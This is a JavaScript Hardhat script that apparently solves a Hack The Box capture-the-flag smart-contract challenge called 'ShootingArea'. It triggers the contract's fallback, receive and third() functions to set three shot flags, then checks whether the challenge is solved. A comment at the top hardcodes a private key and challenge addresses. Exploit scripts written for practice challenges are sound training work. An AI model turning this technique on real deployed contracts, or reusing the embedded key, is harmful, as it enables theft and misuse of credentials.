//imports
const { ethers, network } = require("hardhat");

/*
Private key     :  0x6272c7e1945ea3297e50e61523b4b8142ca03b0913c85b3ba45dc65edf2be5bd
Address         :  0x86Cc354C1bC27272F1f6295cbB0beae3EBd1C646
Target contract :  0xB6b3187bC00334B41acc0D45D9c16856c876932f
Setup contract  :  0xe8CC4a843a6EC32aA63152f3785fB50442c3a330
*/

async function main() {
	const ShootingArea = await ethers.getContractFactory("ShootingArea");
	const Setup = await ethers.getContractFactory("Setup");

	let shootingArea = null;
	let setUp = null;

	if (network.config.chainId === 31337) {
		console.log("Working with HTB RPC");

		shootingArea = await ShootingArea.attach(
			"0xB6b3187bC00334B41acc0D45D9c16856c876932f"
		);
		setUp = await Setup.attach(
			"0xe8CC4a843a6EC32aA63152f3785fB50442c3a330"
		);
	} else {
		shootingArea = await ShootingArea.deploy();
		await shootingArea.deployed();

		// setUp = await Setup.deploy()
		// await setUp.deployed()
	}

	console.log(`ShootingArea deployed at: ${shootingArea.address}`);

	if (setUp) {
		console.log(`Setup deployed at: ${setUp.address}`);
	}

	let firstShotValue = await shootingArea.firstShot();
	let secondShotValue = await shootingArea.secondShot();
	let thirdShotValue = await shootingArea.thirdShot();

	console.log(
		`firstShot: ${firstShotValue}, secondShot: ${secondShotValue}, thirdShot: ${thirdShotValue}`
	);

	const attacker = await ethers.getSigner(network.config.accounts.value);
	// console.log("Deployer address:", attacker.address);

	//invoke the fallback fn.
	await attacker.sendTransaction({
		to: shootingArea.address,
		value: ethers.utils.parseEther("1"),
		//arbitrary data to invoke the fallback fn.
		data: "0x0123456789abcdef"
	});

	console.log("Invoked the fallback fn....");

	firstShotValue = await shootingArea.firstShot();
	secondShotValue = await shootingArea.secondShot();
	thirdShotValue = await shootingArea.thirdShot();

	console.log(
		`firstShot: ${firstShotValue}, secondShot: ${secondShotValue}, thirdShot: ${thirdShotValue}`
	);

	//invoke the receive fn.
	await attacker.sendTransaction({
		to: shootingArea.address,
		value: ethers.utils.parseEther("1")
	});

	console.log("Invoked the receive fn....");

	firstShotValue = await shootingArea.firstShot();
	secondShotValue = await shootingArea.secondShot();
	thirdShotValue = await shootingArea.thirdShot();

	console.log(
		`firstShot: ${firstShotValue}, secondShot: ${secondShotValue}, thirdShot: ${thirdShotValue}`
	);

	console.log("Finally the thirdTarget & Hack the contract....");

	await shootingArea.third();

	console.log("HHhahhahaha passed thirdTarget.....");

	firstShotValue = await shootingArea.firstShot();
	secondShotValue = await shootingArea.secondShot();
	thirdShotValue = await shootingArea.thirdShot();

	console.log(
		`firstShot: ${firstShotValue}, secondShot: ${secondShotValue}, thirdShot: ${thirdShotValue}`
	);

	if (network.config.chainId !== 31337) {
		setUp = await Setup.deploy();
		await setUp.deployed();
		console.log(`Setup deployed at: ${setUp.address}`);
	}

	const isSolved = await setUp.isSolved();

	console.log(`Solved: ${isSolved}`);
}

// main
main()
	.then(() => process.exit(0))
	.catch((error) => {
		console.error(error);
		process.exit(1);
	});
